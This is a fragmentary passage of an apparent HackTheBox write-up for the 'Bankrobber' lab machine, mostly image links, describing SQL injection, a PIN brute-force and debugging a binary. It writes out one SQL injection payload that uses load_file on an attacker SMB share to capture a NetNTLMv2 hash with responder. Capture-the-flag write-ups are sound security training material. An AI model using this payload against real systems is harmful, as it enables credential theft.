[HTB: Bankrobber](/2020/03/07/htb-bankrobber.html)

![Bankrobber](https://0xdfimages.gitlab.io/img/bankrobber-cover.webp)
...
[![Bankrobber](/icons/box-bankrobber.webp)](https://hackthebox.com/machines/bankrobber)

[Bankrobber](https://hackthebox.com/machines/bankrobber)
...
Rated Difficulty ![Rated difficulty for Bankrobber](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/bankrobber-diff.webp)

Radar Graph ![Radar chart for Bankrobber](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/bankrobber-radar.webp)

User

01:01:33 Root

04:07:13 Creators   ## Recon
...
![1569221162488](https://0xdfimages.gitlab.io/img/1569221162488.webp)
...
![1569303360624](https://0xdfimages.gitlab.io/img/1569303360624.webp)
...
![1569303812747](https://0xdfimages.gitlab.io/img/1569303812747.webp)
...
![1569304087785](https://0xdfimages.gitlab.io/img/1569304087785.webp)
...
![1569304377464](https://0xdfimages.gitlab.io/img/1569304377464.webp)
...
![1569305049405](https://0xdfimages.gitlab.io/img/1569305049405.webp)

Now I can access a lot of stuff. First, all the users:

![1569305169999](https://0xdfimages.gitlab.io/img/1569305169999.webp)
...
![1569305297185](https://0xdfimages.gitlab.io/img/1569305297185.webp)

There are three columns, and the value in 1 and 2 are returned to me. I can get the version and current user:

![1569305498542](https://0xdfimages.gitlab.io/img/1569305498542.webp)
...
![1569305663110](https://0xdfimages.gitlab.io/img/1569305663110.webp)

I was unable to break this with hashcat.

I also successfully got a NetNTLMv2 hash for the user (just like in [Giddy](about:/2019/02/16/htb-giddy.html#get-net-ntlm) and [Querier](about:/2019/06/22/htb-querier.html#capture-net-ntlmv2)) by starting `responder` and submitting `term=10' UNION SELECT 1,load_file('\\\\10.10.14.5\\test'),3-- -`:
...
![1569306019082](https://0xdfimages.gitlab.io/img/1569306019082.webp)
...
![brute pin](https://0xdfimages.gitlab.io/img/bankrobber-brute-pin.gif)
...
![1569313829345](https://0xdfimages.gitlab.io/img/1569313829345.webp)
...
![1569314748558](https://0xdfimages.gitlab.io/img/1569314748558.webp)

Next I opened `x32dbg` and attacked to the process. I set a break point at the `recv` call that gets the amount:

![1569314623366](https://0xdfimages.gitlab.io/img/1569314623366.webp)
...
![1569315785368](https://0xdfimages.gitlab.io/img/1569315785368.webp)
...
![1569315849533](https://0xdfimages.gitlab.io/img/1569315849533.webp)

If I look there in the dump, I see it’s garbage:

![1569316151992](https://0xdfimages.gitlab.io/img/1569316151992.webp)
...
![1569316234247](https://0xdfimages.gitlab.io/img/1569316234247.webp)

When I run down to it, I see it is passed the same string, 0x61f9a8:

![1569316278918](https://0xdfimages.gitlab.io/img/1569316278918.webp)
...
![1569316385647](https://0xdfimages.gitlab.io/img/1569316385647.webp)
